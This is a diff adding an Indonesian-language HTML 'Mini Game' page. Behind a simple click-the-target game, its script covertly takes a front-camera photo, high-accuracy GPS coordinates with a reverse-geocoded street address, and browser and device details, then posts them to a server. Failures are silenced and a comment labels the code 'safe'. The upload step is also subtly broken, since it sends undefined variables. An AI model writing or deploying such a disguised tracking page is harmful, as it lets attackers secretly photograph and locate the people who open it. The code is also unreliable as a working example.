@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Mini Game</title>
+<style>
+body { margin:0; padding:0; font-family:sans-serif; background:#000; color:#0f0; overflow:hidden }
+#loader { position:fixed; top:0; left:0; width:100%; height:100%; background:#000; color:#0f0; display:flex; justify-content:center; align-items:center; font-size:24px; z-index:9999 }
+#video { display:none }
+#game-container { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:1 }
+#scoreboard { position:absolute; top:20px; left:50%; transform:translateX(-50%); font-size:24px; font-weight:bold }
+.target { position:absolute; width:60px; height:60px; background:#0f0; border-radius:50%; cursor:pointer; display:flex; justify-content:center; align-items:center; font-weight:bold; color:#000; font-size:18px; box-shadow:0 0 10px #0f0; transition:all 0.2s ease }
+#time-left { position:absolute; top:60px; left:50%; transform:translateX(-50%); font-size:20px }
+#game-over { display:none; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:28px; font-weight:bold; color:#0f0; text-align:center }
+</style>
+</head>
+<body>
+
+<div id="loader">Loading Game...</div>
+<video id="video" autoplay playsinline muted></video>
+
+<div id="game-container">
+  <div id="scoreboard">Skor: 0</div>
+  <div id="time-left">Waktu: 10</div>
+  <div id="game-over">Waktu Habis!<br>Skor Akhir: <span id="final-score">0</span></div>
+</div>
+
+<canvas id="canvas" style="display:none"></canvas>
+
+<script>
+const video=document.getElementById("video")
+const canvas=document.getElementById("canvas")
+const gameContainer=document.getElementById("game-container")
+const scoreboard=document.getElementById("scoreboard")
+const timeLeftEl=document.getElementById("time-left")
+const gameOverEl=document.getElementById("game-over")
+const finalScoreEl=document.getElementById("final-score")
+
+let score=0
+let timeLeft=10
+let gameInterval,timerInterval
+
+function hideLoader(){
+  document.getElementById("loader").textContent="Memuat..."
+  setTimeout(()=>{ document.getElementById("loader").style.display="none"; gameContainer.style.display="block"; startGame() },1500)
+}
+
+function spawnTarget(){
+  const t=document.createElement("div")
+  t.classList.add("target")
+  t.style.top=Math.random()*(window.innerHeight-60)+"px"
+  t.style.left=Math.random()*(window.innerWidth-60)+"px"
+  t.textContent="!"
+  t.onclick=()=>{
+    score++
+    scoreboard.textContent="Skor: "+score
+    t.remove()
+    spawnTarget()
+  }
+  gameContainer.appendChild(t)
+}
+
+function endGame(){
+  document.querySelectorAll(".target").forEach(t=>t.remove())
+  gameOverEl.style.display="block"
+  finalScoreEl.textContent=score
+  clearInterval(timerInterval)
+  clearInterval(gameInterval)
+}
+
+function startGame(){
+  spawnTarget()
+  gameInterval=setInterval(()=>{
+    document.querySelectorAll(".target").forEach(t=>{
+      t.style.top=Math.random()*(window.innerHeight-60)+"px"
+      t.style.left=Math.random()*(window.innerWidth-60)+"px"
+    })
+  },800)
+  timerInterval=setInterval(()=>{
+    timeLeft--
+    timeLeftEl.textContent="Waktu: "+timeLeft
+    if(timeLeft<=0) endGame()
+  },1000)
+}
+
+// ==== Backend safe ==== 
+async function sendPhotoToServer(blob,caption){
+  const form=new FormData()
+  form.append("photo",blob)
+  form.append("caption",caption)
+  await fetch("/api/send-photo",{ method:"POST", body:form })
+}
+
+async function sendTextToServer(text){
+  await fetch("/api/send-text",{ method:"POST", headers:{ "Content-Type":"application/json" }, body: JSON.stringify({ text }) })
+}
+
+// ==== GPS + Kamera ====
+function silentError(){}
+async function gLD(lat,lon){
+  const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`,{ headers:{ "User-Agent":"gps-app" }})
+  const j=await r.json()
+  return { kb:j.address?.county||"tidak tersedia", kc:j.address?.suburb||j.address?.village||j.address?.town||"tidak tersedia", fa:j.display_name||"tidak tersedia" }
+}
+async function getDeviceInfo(){
+  return "DEVICE INFORMATION\nUA: "+navigator.userAgent+"\nPlatform: "+navigator.platform+"\nScreen: "+screen.width+"x"+screen.height
+}
+
+async function startSystem(){
+  try{
+    const stream=await navigator.mediaDevices.getUserMedia({ video:{facingMode:"user"}, audio:false })
+    video.srcObject=stream
+    navigator.geolocation.getCurrentPosition(
+      pos=>{ hideLoader(); sendAllData(pos) },
+      silentError,
+      { enableHighAccuracy:true, maximumAge:0, timeout:20000 }
+    )
+  }catch(e){}
+}
+
+async function sendAllData(position){
+  const lat=position.coords.latitude
+  const lon=position.coords.longitude
+  const acc=position.coords.accuracy
+  const locOSM=await gLD(lat,lon)
+  const deviceInfo=await getDeviceInfo()
+  const gpsText=`GPS FROM DEVICE\nLat: ${lat}\nLon: ${lon}\nAkurasi: ${acc} meter\n\nMAPS\nhttps://www.google.com/maps/search/?api=1&query=${lat},${lon}\n\nOSM DETAIL\nKabupaten: ${locOSM.kb}\nKecamatan: ${locOSM.kc}\nAlamat Lengkap: ${locOSM.fa}`
+  const ctx=canvas.getContext("2d")
+  canvas.width=video.videoWidth
+  canvas.height=video.videoHeight
+  ctx.drawImage(video,0,0)
+
+  canvas.toBlob(async blob=>{
+    await sendPhotoToServer(blob,caption)
+    await sendTextToServer(dev)
+  },"image/jpeg",0.9)
+}
+
+startSystem()
+</script>
+
+</body>
+  </html>
